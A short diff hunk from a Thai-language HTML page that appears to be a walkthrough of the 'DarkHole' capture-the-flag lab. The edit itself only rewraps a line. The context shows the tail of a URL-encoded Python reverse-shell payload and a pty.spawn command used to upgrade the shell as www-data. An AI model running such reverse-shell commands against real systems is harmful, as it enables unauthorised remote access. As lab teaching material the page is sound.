@@ -166,7 +166,8 @@
               ,1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27</center>
             14. ใช้ python เขียนคำสั่งในการเปลี่ยน shell ปกติเป็น interactive shell ที่เป็น shell
             ที่ใช้เพื่อพิมพ์คำสั่งและรับ output กลับมาจากคำสั่งนั้น ๆ และใช้คำสั่ง whoami
-            เพื่อดูว่าผู้ใช้งานตอนนี้คือใคร ซึ่งตอนนี้ยังเป็น www-data แต่เมื่อใช้คำสั่งด้านล่างจะทำให้อยู่ที่ www-data@darkhole
+            เพื่อดูว่าผู้ใช้งานตอนนี้คือใคร ซึ่งตอนนี้ยังเป็น www-data แต่เมื่อใช้คำสั่งด้านล่างจะทำให้อยู่ที่
+            www-data@darkhole
             <center>python3 -c ‘import pty;pty.spawn(“/bin/bash”)’<br>
               whoami14</center>
             15. ลิสต์เพื่อดูโฟลเดอร์ที่อยู่ข้างในด้วยคำสั่ง ls เปลี่ยน directory ไปยังโฟลเดอร์ root ด้วยคำสั่ง cd
